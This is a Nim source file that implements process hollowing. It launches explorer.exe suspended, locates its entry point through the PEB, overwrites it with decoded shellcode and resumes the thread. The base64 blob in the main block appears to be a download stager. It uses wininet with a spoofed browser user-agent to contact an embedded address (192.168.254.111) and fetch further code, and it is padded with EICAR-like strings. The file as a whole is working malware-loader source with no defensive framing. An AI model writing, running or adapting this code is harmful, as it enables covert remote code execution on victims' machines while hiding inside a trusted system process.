import base64, endians
import winim
import winim/lean

type
  PROCESSINFOCLASS {. pure .} = enum
    ProcessBasicInformation = 0

proc ZwQueryInformationProcess(
  ProcessHandle: HANDLE,
  ProcessInformationClass: PROCESSINFOCLASS,
  ProcessInformation: PVOID,
  ProcessInformationLength: ULONG,
  ReturnLength: PULONG):
  NTSTATUS
  {.stdcall, dynlib: "ntdll", importc: "ZwQueryInformationProcess".}


proc process_hollowing[byte](shellcode: openArray[byte]): void =
  let processName = r"explorer.exe"
  var 
    si: STARTUPINFOEX
    pi: PROCESS_INFORMATION
    ps: SECURITY_ATTRIBUTES
    ts: SECURITY_ATTRIBUTES
  
  CreateProcess(NULL, newWideCString(processName), ps, ts, TRUE, CREATE_SUSPENDED, NULL, NULL, addr si.StartupInfo, addr pi)
  
  var targetHandle = pi.hThread
  var pHandle = pi.hProcess
  var bi: PROCESS_BASIC_INFORMATION
  var tmp: ULONG
  discard ZwQueryInformationProcess(pHandle, PROCESSINFOCLASS.ProcessBasicInformation, addr bi, cast[ULONG](sizeof(bi)), addr tmp)
  var bytesWritten: SIZE_T
  var baseAddressBytes: array[0..sizeof(PVOID), byte]
  let ptrToImageBase = cast[PVOID](cast[int64](bi.PebBaseAddress) + 0x10)
  ReadProcessMemory(pHandle, ptrToImageBase, addr baseAddressBytes, sizeof(PVOID), addr bytesWritten)
  var data: array[0..0x200, byte]
  let imageBaseAddress = cast[PVOID](cast[int64](baseAddressBytes))
  ReadProcessMemory(pHandle, imageBaseAddress, addr data, len(data), addr bytesWritten)
  var e_lfanew: uint
  littleEndian32(addr e_lfanew, addr data[0x3c])
  var entrypointRvaOffset = e_lfanew + 0x28
  var entrypointRva: uint
  littleEndian32(addr entrypointRva, addr data[cast[int](entrypointRvaOffset)])
  var entrypointAddress = cast[PVOID](cast[uint64](imageBaseAddress) + entrypointRva)
  WriteProcessMemory(pHandle, entrypointAddress, unsafeAddr shellcode, len(shellcode), addr bytesWritten)
  ResumeThread(targetHandle)
  

when isMainModule:
  func toByteSeq*(str: string): seq[byte] {.inline.} =
    @(str.toOpenArrayByte(0, str.high))
 
  let enc = "/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9XpkwAAAFpIicFBuLsBAABNMclBUUFRagNBUUG6V4mfxv/V63lbSInBSDHSSYnYTTHJUmgAMsCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifG6HwAAAGoAaIAzAABJieBBuQQAAABBunVGnob/1UiJ8UiJ2knHwP////9NMclSUkG6LQYYe//VhcAPhZ0BAABI/88PhIwBAADrs+nkAQAA6IL///8veTZEagA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlAFVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzUuMCkNCgA1TyFQJUBBUFs0XFBaWDU0KFBeKTdDQyk3fSRFSUNBUi1TVEFOREFSRC1BTlRJVklSVVMtVEVTVC1GSUxFISRIK0gqADVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCoANU8hUCVAQVBbNFxQWlg1NChQXik3Q0MpN30kRUlDQVItU1RBTkRBUkQtQU5USVZJUlVTLVRFU1QtRklMRSEkSCtIKgA1TyFQJUBBUFs0XFBaWABBvvC1olb/1UgxyboAAEAAQbgAEAAAQblAAAAAQbpYpFPl/9VIk1NTSInnSInxSInaQbgAIAAASYn5QboSloni/9VIg8QghcB0tmaLB0gBw4XAdddYWFhIBQAAAABQw+h//f//MTkyLjE2OC4yNTQuMTExAAAAAAA="
  let shellcode = toByteSeq(decode(enc))
  process_hollowing(shellcode)

